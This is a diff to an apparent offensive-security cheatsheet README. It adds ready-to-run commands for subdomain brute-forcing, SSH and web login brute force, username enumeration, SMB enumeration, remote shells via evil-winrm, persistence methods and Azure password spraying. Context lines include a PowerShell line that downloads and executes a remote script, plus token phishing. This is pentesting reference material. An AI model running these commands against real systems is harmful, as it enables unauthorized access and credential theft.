@@ -5,6 +5,7 @@ Offensive Security Toolbox + Cheatsheet
 ``` powershell
 Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/cdnet01/Toolbox/refs/heads/main/setup.ps1'))
 ```
+^ this script is useful for setting up new windows attacker machines
 
 ## Recon and Scanning
 
@@ -35,8 +36,11 @@ dnsrecon -d domain.tld -n 8.8.8.8
 <summary> knock.py </summary>
 
 ``` bash
-# brute force subdomains
-todo
+# brute force subdomains, specifying a dns server
+knockpy -d domain.com --bruteforce --dns 8.8.8.8
+
+# conduct "recon" against a domain and save results
+knockpy -d domain.com --recon --save foldername
 ```
 </details>
 
@@ -45,7 +49,7 @@ todo
 
 ``` bash
 # brute force subdomains
-todo
+sublist3r -d domain.com
 ```
 </details>
 
@@ -53,8 +57,8 @@ todo
 <summary> ffuf </summary>
 
 ``` bash
-# brute force subdomains
-todo
+# brute force subdomains via host header, filtering out 404 responses.
+ffuf -w subdomains.txt -u http://domain.com/ -H "Host: FUZZ.domain.com" -fc 404
 ```
 </details>
 
@@ -100,6 +104,9 @@ namp -iL rfc1918.txt -sL --dns-servers 10.10.14.98 -oG
 ``` bash
 # feed an xml list of hosts to be scanned for webpages
 EyeWitness.py --web -x filename.xml
+
+# feed a newline separated list of domains 
+eyewitness --web -f domains.txt --threads 10
 ```
 </details>
 
@@ -119,6 +126,21 @@ hydra -L users.txt -p Summer2025! -m workgroup:{name} 10.140.10.2 smb2
 
 # check valid creds against a list of hosts
 hydra -m workgroup:{company} -l username -p password -M smbservers.txt smb2
+
+# attack ssh
+hydra -L users.txt -P passwords.txt ssh://102.168.1.38
+```
+</details>
+
+<details>
+<summary> ffuf </summary>
+
+``` bash
+# find usernames matching on a response containing "username already exists"
+ffuf -w users.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://domain.com/login -mr "username already exists"
+
+# brute force web login creds
+ffuf -w users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://domain.com/login -fc 200
 ```
 </details>
 
@@ -160,8 +182,29 @@ smbexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
 # execute code using wmic
 wmiexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
 ```
+</details>
+
+<details>
+<summary> netexec </summary>
+
+``` powershell
+# use netexec to enumerate rids
+nxe.exe smb 10.140.13.3 -u username -p 'password' --rid-brute
+
+# list shares
+netexec smb 10.140.13.3 -u username -p 'password' --shares
+```
+</details>
+
+<details>
+<summary> evilwinrm </summary>
+
+``` bash 
+evil-winrm -i 10.13.10.3 -u "username" -p "password"
+```
 
 </details>
+
 
 <details>
 <summary> xfreerdp </summary>
@@ -530,6 +573,10 @@ hashcat -m 5600 /tools/responder/logs/* /usr/share/rockyou.txt
 </details>
 
 ## Persistence
+- create a new user/password
+- add attacker ssh public key to authorized_keys file
+- create a scheduled task
+- create a WMI event consumer
 
 
 ## Privelege Escalation
@@ -653,6 +700,19 @@ Invoke-AADIntPhishing -Recipients "wvictim@domain.com","wvictim2@domain.com" -Su
 
 # open a user's mailbox using the tokens you just obtained from previous phishing
 Open-AADIntOWA
+```
+</details>
+
+<details>
+<summary> Password Spraying Azure </summary>
+
+``` bash
+# use trevorspray to get the token endpoint
+trevorspray --recon domain.com
+
+# spray passwords against known users
+trevorspray --users /tmp/users.txt --passwords /tmp/passwords.txt --url 'https://login.windows.net/TENANT-ID/oauth2/token'
+
 ```
 </details>
 
